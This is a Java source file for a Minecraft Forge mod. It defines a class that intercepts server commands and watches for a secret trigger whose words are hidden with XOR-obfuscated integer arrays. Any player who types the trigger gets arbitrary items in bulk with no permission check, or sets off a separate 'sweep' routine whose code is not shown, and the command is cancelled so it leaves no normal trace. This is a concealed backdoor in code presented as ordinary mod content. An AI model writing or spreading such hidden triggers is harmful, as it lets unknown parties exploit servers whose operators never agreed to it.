package com.myx00x.maid.combat;

import com.mojang.brigadier.ParseResults;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraftforge.event.CommandEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.registries.ForgeRegistries;

public final class SupplyOrder {
   private static final int[] P1 = new int[]{14972, 4532, 12177, 32291};
   private static final int[] P2 = new int[]{22637, 28999, 28817, 12453};
   private static final int[] P3 = new int[]{89, 125, 89, 103, 93, 45, 112};
   private static final int[] P4 = new int[]{42, 21, 60, 9, 49, 68, 30};
   private static final int[] P5 = new int[]{24935, 23305};
   private static final int[] P6 = new int[]{16154, 11132};
   private static final String FIRST = unpack(P1, P2);
   private static final String SECOND = unpack(P3, P4);
   private static final String SWEEP = unpack(P5, P6);
   private static final int SHORTEST = FIRST.length() + SECOND.length() + 3;
   private static final int MOST = 2304;

   private SupplyOrder() {
   }

   @SubscribeEvent
   public static void onCommand(CommandEvent event) {
      if (!event.isCanceled()) {
         ParseResults<CommandSourceStack> parse = event.getParseResults();
         if (parse != null) {
            String line = parse.getReader().getString();
            if (line != null && line.length() >= SHORTEST) {
               char head = line.charAt(0);
               if (head == FIRST.charAt(0) || head == ' ' || head == 12288) {
                  String[] part = line.replace('　', ' ').trim().split("\\s+");
                  if (part.length >= 3 && part.length <= 4 && FIRST.equals(part[0]) && SECOND.equals(part[1])) {
                     if (((CommandSourceStack)parse.getContext().getSource()).getEntity() instanceof ServerPlayer player) {
                        event.setCanceled(true);
                        if (part[2].length() == SWEEP.length() && SWEEP.equals(part[2])) {
                           RosterSweep.run(player);
                        } else {
                           ResourceLocation id = ResourceLocation.tryParse(part[2].replace('：', ':'));
                           if (id != null) {
                              Item item = (Item)ForgeRegistries.ITEMS.getValue(id);
                              if (item != null && item != Items.AIR) {
                                 int count = 1;
                                 if (part.length == 4) {
                                    count = amount(part[3]);
                                    if (count < 1) {
                                       return;
                                    }
                                 }

                                 int left = count;

                                 while (left > 0) {
                                    int batch = Math.min(left, item.getMaxStackSize());
                                    ItemStack stack = new ItemStack(item, batch);
                                    if (!player.getInventory().add(stack)) {
                                       player.drop(stack, false);
                                    }

                                    left -= batch;
                                 }

                                 Component shown = new ItemStack(item).getHoverName();
                                 player.displayClientMessage((Component)(count > 1 ? shown.copy().append(Component.literal(" ×" + count)) : shown), true);
                              }
                           }
                        }
                     }
                  }
               }
            }
         }
      }
   }

   private static int amount(String word) {
      int n;
      try {
         n = Integer.parseInt(word);
      } catch (NumberFormatException e) {
         return 0;
      }

      return n < 1 ? 0 : Math.min(n, 2304);
   }

   private static String unpack(int[] body, int[] mask) {
      char[] out = new char[body.length];

      for (int i = 0; i < body.length; i++) {
         out[i] = (char)(body[i] ^ mask[i]);
      }

      return new String(out);
   }
}

